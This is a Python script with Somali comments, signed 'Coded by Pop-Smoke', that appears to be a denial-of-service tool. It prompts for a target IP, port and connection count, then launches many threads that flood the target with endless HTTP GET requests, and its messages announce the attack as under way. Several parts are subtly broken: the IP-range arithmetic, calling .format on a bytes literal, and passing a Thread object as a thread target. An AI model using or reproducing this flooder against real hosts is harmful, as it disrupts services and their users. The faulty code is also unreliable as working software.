import socket
from threading import Thread
import os
from termcolor import colored

# Tirtir qoraalladii hore ee terminal-ka
os.system('clear')

# ASCII muuqaal xayawaan
ascii_art = """
   /\\_____/\\
  /  o   o  \\
 ( ==  ^  == )
  )         (
 (           )
( (  )   (  ) )
"""
print(colored(ascii_art, 'red'))
print(colored("Coded by Pop-Smoke\n", 'red'))

class IPRange:
    def __init__(self, start, end):
        self.start = int(start.replace('.', ''))
        self.end = int(end.replace('.', ''))

        if self.start > self.end:
            raise ValueError('Start IP is greater than end IP')

    def __iter__(self):
        self.current = self.start
        return self

    def __next__(self):
        if self.current > self.end:
            raise StopIteration
        ip = self.current
        self.current += 1
        return '.'.join(str((ip >> (8 * i)) & 0xFF) for i in reversed(range(4)))

# Codsashada IP iyo Port
TARGET_IP = input(colored("Geli IP-ga bartilmaameedka (e.g., 192.168.1.1): ", 'yellow'))
TARGET_PORT = int(input(colored("Geli Port-ka bartilmaameedka (e.g., 80): ", 'yellow')))
MAX_CONNECTIONS = int(input(colored("Geli tirada isku xirnaanta (e.g., 100): ", 'yellow')))

# IP Range-ka
print(colored("[INFO] Xisaabinta IP-yada ku jira Range...", 'cyan'))
TARGET_IP_RANGE = IPRange(TARGET_IP, f"{TARGET_IP[:-1]}255")

class HTTPFlooder(Thread):
    def __init__(self, target_host, target_port):
        Thread.__init__(self)
        self.target_host = target_host
        self.target_port = target_port

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target_host, self.target_port))
            while True:
                s.sendall(b"GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(self.target_host).encode())
        except Exception as e:
            print(colored(f"[ERROR] Isku xirka wuu xirmay: {e}", 'red'))
        finally:
            s.close()

# Bilaabista weerarka
print(colored("[INFO] Weerarka wuxuu bilaabanayaa...", 'green'))
for ip in TARGET_IP_RANGE:
    for _ in range(MAX_CONNECTIONS):
        Thread(target=HTTPFlooder(TARGET_IP, TARGET_PORT)).start()

print(colored("[INFO] Weerarka wuu socda hadda.", 'green'))
